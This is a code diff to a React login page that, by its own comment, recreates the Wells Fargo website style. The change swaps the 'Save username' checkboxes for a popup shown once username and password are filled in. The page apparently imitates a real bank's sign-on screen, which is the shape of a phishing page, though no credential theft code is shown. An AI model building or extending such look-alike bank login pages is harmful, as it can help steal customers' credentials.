@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -13,9 +13,16 @@ import {
   FormItem,
   FormMessage,
 } from "@/components/ui/form";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+} from "@/components/ui/dialog";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Key, ArrowRight, User, Search, MapPin, ChevronDown, CreditCard, Home, Car, TrendingUp, PiggyBank, Smartphone, Shield, Users, Building2, Headphones } from "lucide-react";
+import { Key, ArrowRight, User, Search, MapPin, ChevronDown, CreditCard, Home, Car, TrendingUp, PiggyBank, Smartphone, Shield, Users, Building2, Headphones, X } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import { OfficialFooter } from "@/components/official-footer";
 import { MobileMenu } from "@/components/mobile-menu";
@@ -41,6 +48,8 @@ export default function LoginPage() {
   const [, setLocation] = useLocation();
   const { toast } = useToast();
   const [biometricLoading, setBiometricLoading] = useState(false);
+  const [showSaveUsernamePopup, setShowSaveUsernamePopup] = useState(false);
+  const [popupDismissed, setPopupDismissed] = useState(false);
 
   const handleBiometricLogin = async () => {
     setBiometricLoading(true);
@@ -145,6 +154,65 @@ export default function LoginPage() {
   };
 
   const hasCredentials = form.watch("username") && form.watch("password");
+  const watchUsername = form.watch("username");
+  const watchPassword = form.watch("password");
+
+  // Show save username popup when both fields are filled
+  useEffect(() => {
+    if (watchUsername && watchPassword && !popupDismissed) {
+      const timer = setTimeout(() => {
+        setShowSaveUsernamePopup(true);
+      }, 500);
+      return () => clearTimeout(timer);
+    }
+  }, [watchUsername, watchPassword, popupDismissed]);
+
+  const handleSaveUsernameChoice = (save: boolean) => {
+    form.setValue("saveUsername", save);
+    setShowSaveUsernamePopup(false);
+    setPopupDismissed(true);
+  };
+
+  // Save Username Popup Component
+  const SaveUsernamePopup = () => (
+    <Dialog open={showSaveUsernamePopup} onOpenChange={(open) => {
+      if (!open) {
+        setShowSaveUsernamePopup(false);
+        setPopupDismissed(true);
+      }
+    }}>
+      <DialogContent className="sm:max-w-md">
+        <DialogHeader>
+          <DialogTitle className="text-xl" style={{ fontFamily: "Georgia, serif" }}>
+            Save username?
+          </DialogTitle>
+          <DialogDescription className="text-base text-gray-600 mt-2">
+            To help keep your account secure, save your username only on devices that aren't used by other people.
+          </DialogDescription>
+        </DialogHeader>
+        <div className="flex flex-col gap-3 mt-4">
+          <Button
+            onClick={() => handleSaveUsernameChoice(true)}
+            className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded"
+            data-testid="popup-button-save-username"
+          >
+            Save username
+          </Button>
+          <Button
+            variant="outline"
+            onClick={() => handleSaveUsernameChoice(false)}
+            className="w-full h-12 border-2 border-gray-300 text-gray-700 font-semibold rounded hover:bg-gray-50"
+            data-testid="popup-button-not-now"
+          >
+            Not now
+          </Button>
+        </div>
+        <p className="text-xs text-gray-500 mt-4 text-center">
+          You can change this preference anytime in your account settings.
+        </p>
+      </DialogContent>
+    </Dialog>
+  );
 
   // Desktop Layout - CSS recreation of Wells Fargo website style
   const DesktopLayout = () => (
@@ -297,25 +365,6 @@ export default function LoginPage() {
                         </div>
                       </FormControl>
                       <FormMessage />
-                    </FormItem>
-                  )}
-                />
-
-                <FormField
-                  control={form.control}
-                  name="saveUsername"
-                  render={({ field }) => (
-                    <FormItem>
-                      <div className="flex items-center gap-2">
-                        <FormControl>
-                          <Checkbox
-                            checked={field.value}
-                            onCheckedChange={field.onChange}
-                            className="h-4 w-4 border-2 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
-                          />
-                        </FormControl>
-                        <label className="text-sm text-[#1a1a1a]">Save username</label>
-                      </div>
                     </FormItem>
                   )}
                 />
@@ -650,34 +699,6 @@ export default function LoginPage() {
               )}
             />
 
-            {/* Save Username */}
-            <FormField
-              control={form.control}
-              name="saveUsername"
-              render={({ field }) => (
-                <FormItem>
-                  <div className="flex items-start gap-3 mt-2">
-                    <FormControl>
-                      <Checkbox
-                        checked={field.value}
-                        onCheckedChange={field.onChange}
-                        className="mt-0.5 h-5 w-5 border-2 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
-                        data-testid="checkbox-save-username"
-                      />
-                    </FormControl>
-                    <div>
-                      <label className="text-base text-[#1a1a1a] font-medium cursor-pointer">
-                        Save username
-                      </label>
-                      <p className="text-sm text-gray-600 mt-1 leading-snug">
-                        To help keep your account secure, save your username only on devices that aren't used by other people.
-                      </p>
-                    </div>
-                  </div>
-                </FormItem>
-              )}
-            />
-
             {/* Sign On Button */}
             <div className="pt-4">
               <Button
@@ -763,6 +784,7 @@ export default function LoginPage() {
     <div className="relative">
       <DesktopLayout />
       <MobileLayout />
+      <SaveUsernamePopup />
     </div>
   );
 }
